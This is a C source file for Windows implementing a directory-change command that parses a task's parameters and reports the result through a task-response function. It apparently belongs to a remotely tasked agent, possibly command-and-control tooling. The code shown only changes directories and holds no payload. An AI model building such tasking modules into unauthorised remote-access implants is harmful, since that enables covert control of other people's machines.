#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <string.h>
#include <windows.h>

#ifdef INCLUDE_CMD_CD

void command_cd(char *task_id, char *params) {
  char path[MAX_PATH] = {0};
  if (params[0] == '{') {
    extract_json_string(params, "path", path, sizeof(path));
  } else {
    strncpy(path, params, sizeof(path) - 1);
  }

  // Remove quotes if present
  if (path[0] == '"') {
    char tmp[MAX_PATH];
    strncpy(tmp, path + 1, sizeof(path) - 2);
    tmp[strlen(tmp) - 1] = 0;
    strncpy(path, tmp, sizeof(path));
  }

  if (strlen(path) > 0 && SetCurrentDirectory(path)) {
    char new_path[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, new_path);
    char output[MAX_PATH + 50];
    snprintf(output, sizeof(output), "Changed directory to: %s", new_path);
    send_task_response(task_id, output);
  } else {
    send_task_response(task_id, "Failed to change directory.");
  }
}

#endif
